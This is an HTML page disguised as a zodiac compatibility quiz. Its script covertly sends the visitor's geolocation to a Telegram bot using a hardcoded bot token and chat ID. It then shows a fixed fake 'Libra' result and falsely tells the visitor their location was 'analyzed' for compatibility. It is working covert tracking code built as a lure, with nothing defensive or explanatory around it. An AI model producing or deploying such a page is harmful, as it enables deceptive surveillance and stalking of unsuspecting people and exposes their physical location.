<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Zodiac Compatibility</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>
  <div class="container">
    <h1>Zodiac Compatibility Test</h1>
    <p>To find your perfect match, we need your location for accurate analysis.</p>
    <button class="location-btn" onclick="getLocation()">Allow Location Access</button>
    <p id="location-status" style="display: none;"></p> <!-- Location won't be shown here -->
    
    <div id="compatibility-result" style="display: none;">
      <h2>Your Zodiac Compatibility Result:</h2>
      <p>Your perfect match is with **Libra**. Congratulations! ðŸŽ‰</p>
    </div>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    function showPosition(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      // Send location data to Telegram Bot (background, no display)
      sendLocationToTelegram(latitude, longitude);

      // Show fake result (Zodiac Compatibility)
      document.getElementById("compatibility-result").style.display = "block";

      // Simulate some result loading (optional)
      setTimeout(function() {
        alert("Your location has been successfully analyzed and your compatibility result is displayed!");
      }, 1000);
    }

    function showError(error) {
      alert("Unable to retrieve your location. Try again.");
    }

    // Send location to Telegram bot (fake API call, replace with your actual API)
    function sendLocationToTelegram(lat, long) {
      const telegramBotToken = '7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk'; // Replace with your Telegram Bot token
      const chatId = '397599597'; // Replace with your chat ID
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=User Location: Latitude ${lat}, Longitude ${long}`;
      
      fetch(url)
        .then(response => response.json())
        .then(data => {
          console.log("Location sent to Telegram:", data);
        })
        .catch(error => {
          console.error("Error sending location:", error);
        });
    }
  </script>
</body>
</html>
